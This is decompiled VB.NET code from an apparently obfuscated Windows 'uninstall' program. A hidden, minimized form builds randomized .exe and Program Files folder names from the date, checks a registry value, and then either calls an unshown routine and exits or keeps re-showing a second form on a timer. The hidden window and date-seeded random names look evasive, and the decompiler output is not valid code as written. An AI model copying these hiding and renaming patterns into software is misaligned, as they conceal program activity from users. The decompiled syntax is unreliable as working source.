Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports uninstall.Internal

Namespace WindowsApplication1
	' Token: 0x0200000B RID: 11
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x06000026 RID: 38 RVA: 0x000023F8 File Offset: 0x000005F8
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.CallConsumer
			Me.CloneConsumer()
		End Sub

		' Token: 0x06000027 RID: 39 RVA: 0x00002854 File Offset: 0x00000A54
		<MethodImpl(MethodImplOptions.NoOptimization)>
		Private Sub CallConsumer(sender As Object, e As EventArgs)
			Dim num As Integer
			Dim num12 As Integer
			Dim obj As Object
			Try
				IL_01:
				ProjectData.ClearProjectError()
				num = 1
				IL_08:
				Dim num2 As Integer = 2
				Dim num3 As Integer = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now)
				IL_20:
				num2 = 3
				Dim num4 As Integer = num3 Mod 7
				IL_27:
				num2 = 4
				Dim num5 As Integer = num3 Mod 9
				IL_2E:
				num2 = 5
				Dim num6 As Integer = num3 Mod 5
				IL_35:
				num2 = 6
				Dim num7 As Integer = num3 Mod 3
				IL_3C:
				num2 = 7
				If num3 Mod 2 <> 0 Then
					GoTo IL_8D
				End If
				IL_43:
				num2 = 8
				MyBase.Name = Conversions.ToString(Strings.Chr(97 + num4)) + Conversions.ToString(Strings.Chr(98 + num5)) + Conversions.ToString(Strings.Chr(101 + num6)) + Conversions.ToString(Strings.Chr(99 + num7))
				GoTo IL_D6
				IL_8D:
				num2 = 10
				MyBase.Name = Conversions.ToString(Strings.Chr(97 + num5)) + Conversions.ToString(Strings.Chr(98 + num4)) + Conversions.ToString(Strings.Chr(101 + num7)) + Conversions.ToString(Strings.Chr(99 + num6))
				IL_D6:
				num2 = 11
				DatabaseWrapper._ParserWrapper = MyBase.Name
				IL_E4:
				num2 = 12
				DatabaseWrapper.propertyWrapper = MyBase.Name + ".exe"
				IL_FC:
				num2 = 13
				VBMath.Randomize(CDbl(num3))
				IL_106:
				num2 = 14
				Dim num8 As Long = CLng(Math.Round(CDbl(VBMath.Rnd()) * 100000.0 * 3.0 + 1.0))
				IL_135:
				num2 = 15
				Dim text As String = ""
				IL_13F:
				num2 = 16
				Dim num9 As Integer = 1
				Do
					IL_17F:
					num2 = 17
					Dim num10 As Long = num8 Mod 10L + 105L
					IL_147:
					num2 = 18
					text = Conversions.ToString(Strings.Chr(CInt(num10))) + text
					IL_160:
					num2 = 19
					num8 /= 10L
					IL_171:
					num2 = 20
					num9 += 1
				Loop While num9 <= 5
				IL_19C:
				num2 = 21
				DatabaseWrapper._ParserWrapper = text
				IL_1A6:
				num2 = 22
				DatabaseWrapper.propertyWrapper = text + ".exe"
				IL_1BA:
				num2 = 23
				DatabaseWrapper._TemplateWrapper = "C:\Program Files (x86)\" + Strings.Mid(text, 2, 4)
				IL_1D5:
				num2 = 24
				MyBase.Show()
				IL_1DE:
				num2 = 25
				Dim left As String = Conversions.ToString(DatabaseWrapper.TestConsumer(Registry.CurrentUser, "Software", "n", ""))
				IL_201:
				num2 = 26
				If Operators.CompareString(left, "", False) <> 0 Then
					GoTo IL_22F
				End If
				IL_213:
				num2 = 27
				DatabaseWrapper.AssetConsumer()
				IL_21B:
				num2 = 28
				Thread.Sleep(7000)
				ProjectData.EndApp()
				GoTo IL_250
				IL_22F:
				num2 = 30
				Template.ResetConsumer.Form2.Show()
				IL_241:
				num2 = 31
				Me.Timer2.Enabled = True
				IL_250:
				GoTo IL_326
				IL_255:
				Dim num11 As Integer = num12 + 1
				num12 = 0
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num11)
				IL_2E5:
				GoTo IL_31B
				IL_2E7:
				num12 = num2
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num)
				IL_2F8:
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num12 = 0)
				Dim ex As Exception = CType(obj2, Exception)
				GoTo IL_2E7
			End Try
			IL_31B:
			Throw ProjectData.CreateProjectError(-2146828237)
			IL_326:
			If num12 <> 0 Then
				ProjectData.ClearProjectError()
			End If
		End Sub

		' Token: 0x06000028 RID: 40 RVA: 0x00002418 File Offset: 0x00000618
		Private Sub ReadConsumer(sender As Object, e As EventArgs)
			If Not Template.ResetConsumer.Form2.Visible Then
				Template.ResetConsumer.Form2.Show()
			End If
		End Sub

		' Token: 0x0600002A RID: 42 RVA: 0x00002BEC File Offset: 0x00000DEC
		<DebuggerStepThrough()>
		Private Sub CloneConsumer()
			Me._Comparator = New Container()
			Me.Timer2 = New Timer(Me._Comparator)
			MyBase.SuspendLayout()
			Me.Timer2.Interval = 1000
			MyBase.AutoScaleDimensions = New SizeF(6F, 12F)
			MyBase.AutoScaleMode = AutoScaleMode.Font
			MyBase.ClientSize = New Size(385, 224)
			MyBase.ControlBox = False
			MyBase.FormBorderStyle = FormBorderStyle.None
			MyBase.Name = "Form1"
			MyBase.ShowInTaskbar = False
			Me.Text = "卸载"
			MyBase.WindowState = FormWindowState.Minimized
			MyBase.ResumeLayout(False)
		End Sub

		' Token: 0x1700000C RID: 12
		' (get) Token: 0x0600002B RID: 43 RVA: 0x0000243A File Offset: 0x0000063A
		' (set) Token: 0x0600002C RID: 44 RVA: 0x00002C98 File Offset: 0x00000E98
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me.m_Singleton
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.ReadConsumer
				Dim singleton As Timer = Me.m_Singleton
				If singleton IsNot Nothing Then
					RemoveHandler singleton.Tick, value2
				End If
				Me.m_Singleton = value
				singleton = Me.m_Singleton
				If singleton IsNot Nothing Then
					AddHandler singleton.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x04000010 RID: 16
		<CompilerGenerated()>
		<AccessedThroughProperty("Timer2")>
		Private m_Singleton As Timer
	End Class
End Namespace
